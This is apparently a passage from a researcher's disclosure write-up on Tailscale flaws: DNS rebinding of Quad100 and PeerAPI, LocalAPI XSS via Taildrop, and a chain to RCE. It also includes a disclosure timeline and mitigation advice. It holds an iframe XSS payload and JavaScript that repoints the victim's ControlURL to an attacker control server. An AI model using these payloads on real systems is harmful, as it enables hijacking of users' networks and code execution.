<h2 id="long-live-dns-rebinding"><a aria-hidden="true" tabindex="-1" href="#long-live-dns-rebinding"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Long Live DNS Rebinding</h2><p>Tailscaled runs a web server at 100.100.100.100. This is all it does:</p>
<p><img src="https://emily.id.au/posts/tailscale/quad100.png" alt="The page 100.100.100.100, open in Chrome: &#34;Tailscale. Local Addresses: 100.109.225.113, fd7a:(rest of v6 address)&#34;"/></p>
<div>

<h3 id="issue-4---quad100-vulnerable-to-dns-rebinding"><a aria-hidden="true" tabindex="-1" href="#issue-4---quad100-vulnerable-to-dns-rebinding"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 4 - Quad100 vulnerable to DNS Rebinding</h3><p><em>Resolved in <code>1.32.3</code> (<code>Host</code> header allowlist implemented)</em></p>
</div>

<p>It ain&#39;t much, but it&#39;s rebindable, and it lets us learn the target&#39;s Tailnet IP
address. And unlike the LocalAPI, this one works everywhere, not just Windows!</p>
<p>Hey, what&#39;s this?</p>
<p><img src="https://emily.id.au/posts/tailscale/peerapi.png" alt=""/></p>
<p>This is the <strong>PeerAPI</strong>. It&#39;s an API exposed over HTTP, on a
<a href="https://github.com/tailscale/tailscale/blob/7c285fe7ee67ae6a986fc543d1a28beda4db7462/ipn/ipnlocal/peerapi.go#L425-L444" title="null" rel="noopener noreferrer">predictable port</a>,
to other nodes on the Tailnet. It&#39;s not used for the core functionality of
Tailscale, but for additional features, like Taildrop, as well as for some
<a href="https://pulsesecurity.co.nz/articles/some-tailscale-tricks" title="null" rel="noopener noreferrer">introspection functionality</a>.</p>
<div>

<h3 id="issue-5---peerapi-vulnerable-to-dns-rebinding"><a aria-hidden="true" tabindex="-1" href="#issue-5---peerapi-vulnerable-to-dns-rebinding"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 5 - PeerAPI vulnerable to DNS Rebinding</h3><p><strong>CVE</strong>: CVE-2022-41925</p>
</div>

<p>What address space is it in? That&#39;s right, tailnet address space! We can rebind
to Quad100, learn the target&#39;s tailnet address, calculate their PeerAPI port,
rebind to <em>that</em>, dump their environment variables, learn about their other
tailnet devices, and send them files via Taildrop.</p>
<h3 id="how-taildrop-works"><a aria-hidden="true" tabindex="-1" href="#how-taildrop-works"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>How Taildrop Works</h3><ol>
<li>When I want to send a file to one of my fellow Tailscale nodes, I connect to
its PeerAPI, and PUT a file to <code>/v0/put/$filename-of-my-choosing</code>.</li>
<li><code>tailscaled</code> stores this file in a temporary location. On Windows, that&#39;s
<code>C:\ProgramData\Tailscale\files\$email-uid-$uid\$filename-of-my-choosing</code>.</li>
<li><code>tailscaled</code> informs the GUI that a new file has arrived</li>
<li>The GUI fetches the file from <code>tailscaled</code> through a GET request to the
LocalAPI, and saves it to the desktop.</li>
<li>The LocalAPI GET request is served with <code>Content-Type: text/html</code>.</li>
</ol>
<p><img src="https://emily.id.au/posts/tailscale/gru.jpg" alt=""/></p>
<div>

<h3 id="issue-6-cross-site-scripting-in-localapi"><a aria-hidden="true" tabindex="-1" href="#issue-6-cross-site-scripting-in-localapi"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Issue 6: Cross-Site Scripting in LocalAPI</h3><p><em>Resolved in <code>1.32.3</code> through <code>Content-Type</code> fix, <code>Content-Security-Policy</code>, and
request header checks</em></p>
</div>

<p>Exploiting this XSS issue in practice requires some trickery. As part of
handling the LocalAPI GET request, tailscaled will delete the file from the
temporary directory, since it has now been moved to its final location. This
happens automatically, so we would need to win a race against the GUI to load
our HTML before it is destroyed.</p>
<p>Instead, we discovered that if we upload multiple files with the same name to in
parallel, the various threads will fight over the shared filename, and some of
the requests will end up failing, meaning that the file never gets deleted. We
can load the HTML in an <code>iframe</code>, which is not prohibited by PNA:</p>
<div><pre><span><span><span>&lt;</span>iframe</span> <span>src</span><span><span>=</span><span>&#34;</span>http://127.0.0.1:41112/localapi/v0/files/evil.html<span>&#34;</span></span><span>&gt;</span></span><span><span><span>&lt;/</span>iframe</span><span>&gt;</span></span></pre></div><p>Now our Javascript is running in a true LocalAPI origin, we gain equivalent
access to what we got from Issue 1, but without Chromium&#39;s pesky security
features getting in the way.</p>
<p>The path to RCE from here is the same as earlier, but with an extra little bit
of polish now available. On the very same day we discovered the XSS
vulnerability, the first commits of a new feature were trickling into the <code>main</code>
branch of the Tailscale GitHub repo.
<a href="https://github.com/tailscale/tailscale/issues/713#issuecomment-1320546602" title="null" rel="noopener noreferrer">Fast User Switching</a>
(work in progress, not yet available in a released Tailscale version) allows
Tailscale to switch between multiple accounts without logging out and logging in
from scratch. As part of this, tailscaled may need to switch to another control
plane server, without manually being restarted! We can use this feature to have
our target machine join the Headscale tailnet in just a few seconds, no reboot
required:</p>
<div><pre><span>let</span> id <span>=</span>
  <span>(</span><span>await</span> <span>(</span><span>await</span> <span>fetch</span><span>(</span><span>&#34;/localapi/v0/profiles/current&#34;</span><span>,</span> <span>{</span> <span>method</span><span>:</span> <span>&#34;GET&#34;</span> <span>}</span><span>)</span><span>)</span>
    <span>.</span><span>json</span><span>(</span><span>)</span><span>)</span><span>.</span><span>ID</span><span>;</span>
<span>await</span> <span>fetch</span><span>(</span><span>&#34;/localapi/v0/prefs&#34;</span><span>,</span> <span>{</span>
  <span>method</span><span>:</span> <span>&#34;PATCH&#34;</span><span>,</span>
  <span>body</span><span>:</span> <span>JSON</span><span>.</span><span>stringify</span><span>(</span><span>{</span>
    <span>ControlURL</span><span>:</span> <span>&#34;http://1.2.3.4:8080&#34;</span><span>,</span>
    <span>ControlURLSet</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>)</span><span>,</span>
<span>}</span><span>)</span><span>;</span>
<span>await</span> <span>sleep</span><span>(</span><span>1000</span><span>)</span><span>;</span>
<span>await</span> <span>fetch</span><span>(</span><span>&#34;/localapi/v0/profiles/&#34;</span><span>,</span> <span>{</span> <span>method</span><span>:</span> <span>&#34;PUT&#34;</span> <span>}</span><span>)</span><span>;</span>
<span>await</span> <span>sleep</span><span>(</span><span>1000</span><span>)</span><span>;</span>
<span>await</span> <span>fetch</span><span>(</span><span>&#34;/localapi/v0/profiles/&#34;</span> <span>+</span> id<span>,</span> <span>{</span> <span>method</span><span>:</span> <span>&#34;POST&#34;</span> <span>}</span><span>)</span><span>;</span></pre></div><h3 id="demo-time-again"><a aria-hidden="true" tabindex="-1" href="#demo-time-again"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Demo Time, Again</h3><p>By chaining issues 4, 5, 6, 2, and 3; we can finally achieve RCE against Chrome
users over the public internet:</p>
<iframe width="1240" height="775" src="https://www.youtube.com/embed/3UIj4YX3qAE" title="RCE from Malicious Tailscale Control Plane" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>

<p>Tailscale&#39;s documentation tends to encourage a model wherein web services are
published to the Tailnet over unencrypted HTTP, and authentication based solely
on network position, whether implicitly (services lacking authentication) or
explicitly (identifying the user with <code>whois</code> requests).</p>
<p>While we have not undertaken in-depth research here, we suspect that real-world
Tailscale deployments have many high-impact rebindable web services.</p>
<p>Let&#39;s compare the Tailscale approach to two alternative models, in the context
of DNS rebinding attacks:</p>
<h3 id="beyondcorp-style-https-access-proxies"><a aria-hidden="true" tabindex="-1" href="#beyondcorp-style-https-access-proxies"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>BeyondCorp-style HTTPS access proxies</h3><p>DNS Rebinding attacks generally don&#39;t work against HTTPS services: if the
target&#39;s browser loads
<code>https://toggle-between-attacker-and-webmail.attacker.com</code> and reaches out to
the legitimate webmail server, it will be presented with a TLS certificate which
does not match the rebound domain, and will throw a certificate error.</p>
<h3 id="implicitly-trusted-flat-network-with-internal-http-services-traditional-vpns"><a aria-hidden="true" tabindex="-1" href="#implicitly-trusted-flat-network-with-internal-http-services-traditional-vpns"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Implicitly-trusted flat network with internal HTTP services, traditional VPNs</h3><p>Traditionally, this case would be equivalent to the Tailscale case. However, the
advent of Private Network Access protection in Chromium-based browsers ends up
providing what appears to be effective protection against rebinding attacks for
these browsers in traditional private networks ‚Äì protection which is
unfortunately not extended to Tailscale customers.</p>
<h3 id="recommendations"><a aria-hidden="true" tabindex="-1" href="#recommendations"><svg viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M7.775 3.275a.75.75 0 001.06 1.06l1.25-1.25a2 2 0 112.83 2.83l-2.5 2.5a2 2 0 01-2.83 0 .75.75 0 00-1.06 1.06 3.5 3.5 0 004.95 0l2.5-2.5a3.5 3.5 0 00-4.95-4.95l-1.25 1.25zm-4.69 9.64a2 2 0 010-2.83l2.5-2.5a2 2 0 012.83 0 .75.75 0 001.06-1.06 3.5 3.5 0 00-4.95 0l-2.5 2.5a3.5 3.5 0 004.95 4.95l1.25-1.25a.75.75 0 00-1.06-1.06l-1.25 1.25a2 2 0 01-2.83 0z"></path></svg></a>Recommendations</h3><p>This is a thorny issue, and we don&#39;t see an obvious mitigation for Tailscale to
implement. The onus thus shifts to Tailscale&#39;s customers.</p>
<p>If you run non-HTTPS web services on your Tailnet, and those services are
unauthenticated <em>or</em> rely on Tailscale for authentication, implement an
allowlist of expected HTTP <code>Host</code> headers to prevent malicious Javascript from
accessing these services.</p>
<p>This mitigation can be tested with <code>curl</code> ‚Äì if you can put something random in
the <code>Host</code> header, and you can view information or take actions which should not
be available to the public, action is required:</p>
<p><img src="https://emily.id.au/posts/tailscale/dns-rebinding.png" alt=""/></p>
<p>Alternatively, you can use Tailscale&#39;s built-in TLS certificate support to run
internal services with HTTPS (and with HTTP disabled or just redirecting to
HTTPS), either <a href="https://tailscale.com/blog/tls-certs/" title="null" rel="noopener noreferrer">directly</a> or via
something like <a href="https://tailscale.com/blog/caddy/" title="null" rel="noopener noreferrer">caddy</a>.</p>
<p>Tailscale has published remediation advice for this issue
<a href="https://tailscale.com/kb/1196/security-hardening/#prevent-dns-rebinding-attacks" title="null" rel="noopener noreferrer">here</a>.</p>
<p>The speed and quality of Tailscale&#39;s response to our report is unlike any vendor
interaction I have experienced, and suggests a deep commitment to keeping their
customers safe.</p>
<p>Times in NZDT (UTC+13):</p>
<ul>
<li><strong>Mon 7 November</strong>: Emily starts research, identifies LocalAPI as rebindable</li>
<li><strong>Thu 10 November</strong>: Jamie joins research</li>
<li>...hacking in progress...</li>
<li><strong>Wed 16 November, 12:07AM</strong>: Report sent to <a href="mailto:security@tailscale.com" title="undefined" rel="noopener noreferrer">security@tailscale.com</a>, covering
all 7 issues</li>
<li><strong>Wed 16 November, 2:04AM</strong>: Confirmation of receipt</li>
<li><strong>Wed 16 November, 4:54AM-9:11AM</strong>: Fixes for issues 1/2/4/5/6 committed,
including several additional high-quality defence-in-depth mitigations on top
of our suggested fixes</li>
<li><strong>Wed 16 November, 8:36AM</strong>:
<a href="https://twitter.com/Tailscale/status/1592964802263289857" title="null" rel="noopener noreferrer">A bunch of Tailscale people are on a train</a>.
I&#39;m not really certain how this affects things, but it&#39;s pretty cool</li>
<li><strong>Wed 16 November, 10:52AM</strong>: Full reply from Tailscale, containing:<ul>
<li>Details of all fixes made so far;</li>
<li>Plans for additional fixes yet to be made, review of logs to check for past
exploitation, etc;</li>
<li>Request for our input on the completeness of the fix;</li>
<li>Estimate of coordinted disclosure timeline;</li>
<li>Vouchers for Tailscale Personal Pro accounts &amp; Tailscale Merch;</li>
<li>Offer of US$10,000 bounty, despite the Security page explicitly saying they
do not have a bounty program!</li>
</ul>
</li>
<li><strong>Wed 16 November, 4:17PM</strong>: We confirm that the major issues are resolved</li>
<li><strong>Wed 16 November, 6:51PM</strong>:
<a href="https://twitter.com/Tailscale/status/1593119669569081350" title="null" rel="noopener noreferrer">The train arrives in Seattle</a></li>
<li>...discussion and implementation of additional defense-in-depth measures;
issue 3 resolved...</li>
<li><strong>Sat 19 November</strong>: Coordinated Disclosure time proposed by Tailscale,
accepted by us, Tailscale shares planned Security Bulletins and blog post</li>
<li><strong>Tue 22 November, 5:06AM</strong>: Blog draft shared with Tailscale (a bit last
minute, sorry!!!)</li>
<li><strong>Tue 22 November, 7:00AM</strong>: Coordinated disclosure time</li>
</ul>
<hr/>
<p>Jamie McClymont (<a href="https://twitter.com/JJJollyjim" title="null" rel="noopener noreferrer">twitter</a>,
<a href="https://cohost.org/jjjollyjim" title="null" rel="noopener noreferrer">cohost</a>,
<a href="https://social.memes.nz/@jamie" title="null" rel="noopener noreferrer">mastodon</a>)</p>
<svg viewBox="0.00 0.00 1408.99 1262.40" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<g id="graph0" transform="scale(1 1) rotate(0) translate(21.6 1240.8)">
<polygon fill="#ffffff" stroke="transparent" points="-21.6,21.6 -21.6,-1240.8 1387.3949,-1240.8 1387.3949,21.6 -21.6,21.6"></polygon>
<!-- foothold -->
<g id="node1">
<title>foothold</title>
<ellipse fill="none" stroke="#000000" cx="671.1103" cy="-1112.4" rx="149.8357" ry="18"></ellipse>
<text text-anchor="middle" x="671.1103" y="-1108.2" font-family="sans-serif" font-size="14.00" fill="#000000">Attacker runs JS in target&#39;s browser</text>
</g>
<!-- LocalAPI is same-origin -->
<g id="node3">
<title>LocalAPI is same-origin</title>
<ellipse fill="none" stroke="#000000" cx="597.1103" cy="-529.2" rx="105.9344" ry="18"></ellipse>
<text text-anchor="middle" x="597.1103" y="-525" font-family="sans-serif" font-size="14.00" fill="#000000">LocalAPI is same-origin</text>
</g>
<!-- foothold->LocalAPI is same-origin -->
<g id="edge2">
<title>foothold-&gt;LocalAPI is same-origin</title>
<path fill="none" stroke="#404040" d="M671.1103,-1094.3721C671.1103,-1076.4311 671.1103,-1048.1125 671.1103,-1023.6 671.1103,-1023.6 671.1103,-1023.6 671.1103,-637.2 671.1103,-604.6007 675.8177,-591.8973 657.1103,-565.2 653.6269,-560.2289 649.2174,-555.8268 644.376,-551.961"></path>
<polygon fill="#404040" stroke="#404040" points="646.0896,-548.8855 635.9079,-545.9558 642.0403,-554.5954 646.0896,-548.8855"></polygon>
<text text-anchor="middle" x="846.6402" y="-851.4" font-family="sans-serif" font-size="14.00" fill="#000000">Bug 1: LocalAPI Rebinding</text>
<text text-anchor="middle" x="846.6402" y="-834.6" font-family="sans-serif" font-size="14.00" fill="#000000">if (Windows and</text>
<text text-anchor="middle" x="846.6402" y="-817.8" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†¬†¬†¬†¬†¬†(Firefox or same physical network or same tailnet)) ¬†¬†¬†¬†¬†¬†¬†¬†</text>
</g>
<!-- Quad100 is same-origin -->
<g id="node4">
<title>Quad100 is same-origin</title>
<ellipse fill="none" stroke="#000000" cx="472.1103" cy="-1023.6" rx="103.6566" ry="18"></ellipse>
<text text-anchor="middle" x="472.1103" y="-1019.4" font-family="sans-serif" font-size="14.00" fill="#000000">Quad100 is same-origin</text>
</g>
<!-- foothold->Quad100 is same-origin -->
<g id="edge3">
<title>foothold-&gt;Quad100 is same-origin</title>
<path fill="none" stroke="#404040" d="M547.8774,-1102.1595C514.9512,-1096.8044 485.4944,-1088.6854 474.7295,-1076.4 468.8605,-1069.7021 467.0643,-1060.4961 467.0965,-1051.6457"></path>
<polygon fill="#404040" stroke="#404040" points="470.593,-1051.8218 467.8399,-1041.5909 463.612,-1051.3056 470.593,-1051.8218"></polygon>
<text text-anchor="middle" x="566.3007" y="-1063.8" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†Bug 4: Quad100 Rebinding ¬†¬†¬†</text>
</g>
<!-- Impersonation on Tailnet -->
<g id="node5">
<title>Impersonation on Tailnet</title>
<polygon fill="none" stroke="#000000" points="1062.1103,-336 860.1103,-336 860.1103,-300 1062.1103,-300 1062.1103,-336"></polygon>
<text text-anchor="middle" x="961.1103" y="-313.8" font-family="sans-serif" font-size="14.00" fill="#000000">Impersonation on Tailnet</text>
</g>
<!-- foothold->Impersonation on Tailnet -->
<g id="edge4">
<title>foothold-&gt;Impersonation on Tailnet</title>
<path fill="none" stroke="#404040" d="M809.8152,-1105.612C918.0318,-1096.3859 1050.1103,-1074.6656 1050.1103,-1023.6 1050.1103,-1023.6 1050.1103,-1023.6 1050.1103,-423.6 1050.1103,-392.0471 1055.478,-378.9094 1036.1103,-354 1032.4754,-349.3251 1028.0811,-345.2243 1023.2638,-341.6335"></path>
<polygon fill="#404040" stroke="#404040" points="1025.0914,-338.6461 1014.8168,-336.0607 1021.2365,-344.4891 1025.0914,-338.6461"></polygon>
<text text-anchor="middle" x="1207.9526" y="-747" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†¬†¬†¬†¬†¬†Bug 7: Rebinding to other Tailnet services</text>
<text text-anchor="middle" x="1207.9526" y="-730.2" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†¬†¬†¬†¬†¬†if (services speak plain HTTP without Host check)</text>
</g>
<!-- Start -->
<g id="node2">
<title>Start</title>
<ellipse fill="none" stroke="#000000" cx="671.1103" cy="-1201.2" rx="29.049" ry="18"></ellipse>
<text text-anchor="middle" x="671.1103" y="-1197" font-family="sans-serif" font-size="14.00" fill="#000000">Start</text>
</g>
<!-- Start->foothold -->
<g id="edge1">
<title>Start-&gt;foothold</title>
<path fill="none" stroke="#404040" d="M671.1103,-1182.8006C671.1103,-1170.6949 671.1103,-1154.6076 671.1103,-1140.8674"></path>
<polygon fill="#404040" stroke="#404040" points="674.6104,-1140.472 671.1103,-1130.472 667.6104,-1140.4721 674.6104,-1140.472"></polygon>
<text text-anchor="middle" x="801.3698" y="-1152.6" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†¬†¬†Phishing, Malvertising, XSS of 3rd-parties</text>
</g>
<!-- Tailnet information disclosure -->
<g id="node13">
<title>Tailnet information disclosure</title>
<polygon fill="none" stroke="#000000" points="455.1103,-441.6 239.1103,-441.6 239.1103,-405.6 455.1103,-405.6 455.1103,-441.6"></polygon>
<text text-anchor="middle" x="347.1103" y="-419.4" font-family="sans-serif" font-size="14.00" fill="#000000">Tailnet information disclosure</text>
</g>
<!-- LocalAPI is same-origin->Tailnet information disclosure -->
<g id="edge16">
<title>LocalAPI is same-origin-&gt;Tailnet information disclosure</title>
<path fill="none" stroke="#404040" d="M557.497,-512.4674C514.7328,-494.4037 446.428,-465.5518 399.3087,-445.6486"></path>
<polygon fill="#404040" stroke="#404040" points="400.4608,-442.3359 389.887,-441.6689 397.737,-448.7842 400.4608,-442.3359"></polygon>
<text text-anchor="middle" x="546.4371" y="-480.6" font-family="sans-serif" font-size="14.00" fill="#000000">GET status,</text>
<text text-anchor="middle" x="546.4371" y="-463.8" font-family="sans-serif" font-size="14.00" fill="#000000">GET whois...</text>
</g>
<!-- Node Private Key disclosure -->
<g id="node14">
<title>Node Private Key disclosure</title>
<ellipse fill="none" stroke="#000000" cx="866.1103" cy="-423.6" rx="121.5709" ry="18"></ellipse>
<text text-anchor="middle" x="866.1103" y="-419.4" font-family="sans-serif" font-size="14.00" fill="#000000">Node Private Key disclosure</text>
</g>
<!-- LocalAPI is same-origin->Node Private Key disclosure -->
<g id="edge14">
<title>LocalAPI is same-origin-&gt;Node Private Key disclosure</title>
<path fill="none" stroke="#404040" d="M684.431,-518.9071C713.1886,-513.5282 744.7806,-505.4084 772.1103,-493.2 797.0309,-482.0677 821.6963,-463.438 839.5043,-448.253"></path>
<polygon fill="#404040" stroke="#404040" points="841.9447,-450.7688 847.1801,-441.5578 837.3434,-445.4935 841.9447,-450.7688"></polygon>
<text text-anchor="middle" x="862.793" y="-472.2" font-family="sans-serif" font-size="14.00" fill="#000000">PATCH prefs</text>
</g>
<!-- Pending ControlURL change -->
<g id="node15">
<title>Pending ControlURL change</title>
<ellipse fill="none" stroke="#000000" cx="597.1103" cy="-423.6" rx="123.864" ry="18"></ellipse>
<text text-anchor="middle" x="597.1103" y="-419.4" font-family="sans-serif" font-size="14.00" fill="#000000">Pending ControlURL change</text>
</g>
<!-- LocalAPI is same-origin->Pending ControlURL change -->
<g id="edge17">
<title>LocalAPI is same-origin-&gt;Pending ControlURL change</title>
<path fill="none" stroke="#404040" d="M597.1103,-510.8059C597.1103,-494.5279 597.1103,-470.5223 597.1103,-451.8163"></path>
<polygon fill="#404040" stroke="#404040" points="600.6104,-451.7833 597.1103,-441.7833 593.6104,-451.7834 600.6104,-451.7833"></polygon>
<text text-anchor="middle" x="682.8407" y="-472.2" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†PATCH prefs (ControlURL)</text>
</g>
<!-- Tailnet IP known -->
<g id="node6">
<title>Tailnet IP known</title>
<ellipse fill="none" stroke="#000000" cx="377.1103" cy="-934.8" rx="78.1714" ry="18"></ellipse>
<text text-anchor="middle" x="377.1103" y="-930.6" font-family="sans-serif" font-size="14.00" fill="#000000">Tailnet IP known</text>
</g>
<!-- Quad100 is same-origin->Tailnet IP known -->
<g id="edge5">
<title>Quad100 is same-origin-&gt;Tailnet IP known</title>
<path fill="none" stroke="#404040" d="M452.8856,-1005.63C438.6281,-992.303 419.027,-973.9811 403.3324,-959.3108"></path>
<polygon fill="#404040" stroke="#404040" points="405.6776,-956.712 395.9821,-952.4402 400.8976,-961.8258 405.6776,-956.712"></polygon>
<text text-anchor="middle" x="451.4115" y="-975" font-family="sans-serif" font-size="14.00" fill="#000000">GET /</text>
</g>
<!-- PeerAPI address known -->
<g id="node7">
<title>PeerAPI address known</title>
<ellipse fill="none" stroke="#000000" cx="353.1103" cy="-838.8" rx="103.6354" ry="18"></ellipse>
<text text-anchor="middle" x="353.1103" y="-834.6" font-family="sans-serif" font-size="14.00" fill="#000000">PeerAPI address known</text>
</g>
<!-- Tailnet IP known->PeerAPI address known -->
<g id="edge6">
<title>Tailnet IP known-&gt;PeerAPI address known</title>
<path fill="none" stroke="#404040" d="M372.5961,-916.7431C369.0985,-902.753 364.1884,-883.1125 360.1722,-867.0476"></path>
<polygon fill="#404040" stroke="#404040" points="363.5068,-865.9548 357.6858,-857.1023 356.7158,-867.6526 363.5068,-865.9548"></polygon>
<text text-anchor="middle" x="456.9543" y="-886.2" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†¬†Deterministic port algorithm</text>
</g>
<!-- PeerAPI is same-origin -->
<g id="node8">
<title>PeerAPI is same-origin</title>
<ellipse fill="none" stroke="#000000" cx="347.1103" cy="-742.8" rx="101.2776" ry="18"></ellipse>
<text text-anchor="middle" x="347.1103" y="-738.6" font-family="sans-serif" font-size="14.00" fill="#000000">PeerAPI is same-origin</text>
</g>
<!-- PeerAPI address known->PeerAPI is same-origin -->
<g id="edge7">
<title>PeerAPI address known-&gt;PeerAPI is same-origin</title>
<path fill="none" stroke="#404040" d="M351.9817,-820.7431C351.1157,-806.8862 349.9032,-787.4861 348.9045,-771.5075"></path>
<polygon fill="#404040" stroke="#404040" points="352.3712,-770.8645 348.2542,-761.1023 345.3849,-771.3012 352.3712,-770.8645"></polygon>
<text text-anchor="middle" x="433.3512" y="-783" font-family="sans-serif" font-size="14.00" fill="#000000"> ¬†¬†¬†Bug 5: PeerAPI Rebinding</text>
</g>
<!-- Malware sitting on machine -->
<g id="node9">
<title>Malware sitting on machine</title>
<ellipse fill="none" stroke="#000000" cx="119.1103" cy="-583.2" rx="119.2206" ry="18"></ellipse>
<text text-anchor="middle" x="119.1103" y="-579" font-family="sans-serif" font-size="14.00" fill="#000000">Malware sitting on machine</text>
</g>
<!-- PeerAPI is same-origin->Malware sitting on machine -->
<g id="edge8">
<title>PeerAPI is same-origin-&gt;Malware sitting on machine</title>
<path fill="none" stroke="#404040" d="M260.1533,-733.5616C203.3894,-726.6681 138.1518,-716.7585 128.9945,-706.8 105.6086,-681.368 107.6607,-639.2435 112.4466,-611.3528"></path>
<polygon fill="#404040" stroke="#404040" points="115.9041,-611.9077 114.3673,-601.4249 109.0315,-610.578 115.9041,-611.9077"></polygon>
<text text-anchor="middle" x="189.1682" y="-694.2" font-family="sans-serif" font-size="14.00" fill="#000000">/v0/put/ ¬†</text>
<text text-anchor="middle" x="189.1682" y="-677.4" font-family="sans-serif" font-size="14.00" fill="#000000">if(Taildrop enabled) ¬†</text>
</g>
<!-- Persistant file in Taildrop inbox -->
<g id="node11">
<title>Persistant file in Taildrop inbox</title>
<ellipse fill="none" stroke="#000000" cx="509.1103" cy="-637.2" rx="133.7458" ry="18"></ellipse>
<text text-anchor="middle" x="509.1103" y="-633" font-family="sans-serif" font-size="14.00" fill="#000000">Persistant file in Taildrop inbox</text>
</g>
